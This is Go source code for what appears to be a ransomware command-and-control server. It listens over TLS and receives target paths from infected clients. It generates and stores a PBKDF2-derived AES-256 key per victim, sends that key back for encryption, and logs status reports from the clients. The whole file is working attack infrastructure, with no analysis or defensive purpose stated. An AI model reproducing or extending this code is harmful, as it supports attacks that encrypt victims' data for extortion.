package main

import (
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
    "time"
	"net/http"
	"strings"
	"utils"
)

var targetPath []byte

func checkConnection(res http.ResponseWriter, req *http.Request) {
	if cmp := strings.Compare(strings.ToLower(req.Method), "get"); cmp != 0 {
		return
	}

	fmt.Println("[+] Received a Get Request from", req.URL.EscapedPath())
}

func getTargetPath(res http.ResponseWriter, req *http.Request) {
	if cmp := strings.Compare(strings.ToLower(req.Method), "post"); cmp != 0 {
		return
	}

	fmt.Println("[+] Received a Post Request from", req.URL.EscapedPath())

	targetPath, _ = ioutil.ReadAll(req.Body)
}

func sendKey(res http.ResponseWriter, req *http.Request) {
	if cmp := strings.Compare(strings.ToLower(req.Method), "get"); cmp != 0 {
		return
	}

	passwd := utils.GenPasswd()
	aesKey, usedSalt := utils.ExtractPbkdf2Key(passwd)
	encodedSalt := hex.EncodeToString(usedSalt)

	utils.StoreCryptoInfo(passwd, encodedSalt, targetPath)
	fmt.Printf("[AES 256 INFO]\n[*] Generated key: %x\n[*] Key Length: %v\n[*] Salt: %s\n", aesKey, len(aesKey), encodedSalt)
	fmt.Fprint(res, hex.EncodeToString(aesKey))
}

func getServiceStatus(res http.ResponseWriter, req *http.Request) {
	if cmp := strings.Compare(strings.ToLower(req.Method), "post"); cmp != 0 {
		return
	}

	fmt.Println("[+] Received a Post Request from", req.URL.EscapedPath())

	status, err := ioutil.ReadAll(req.Body)

	if err != nil {
		log.Fatal(err)
	}

    currentTime := time.Now().UTC()
    y, m, d := currentTime.Date()
    fmt.Printf("[%v/%v/%v] Current status:\n%v\n", d, m, y, string(status))
}

func main() {
	fmt.Println("[+] Listening....")
	http.HandleFunc("/Cry", checkConnection)
	http.HandleFunc("/CryP4th", getTargetPath)
	http.HandleFunc("/n0LcRy", sendKey)
	http.HandleFunc("/CryS4TUS", getServiceStatus)
	http.ListenAndServeTLS(":8080", "./certs/server.crt", "./certs/server.key", nil)
}
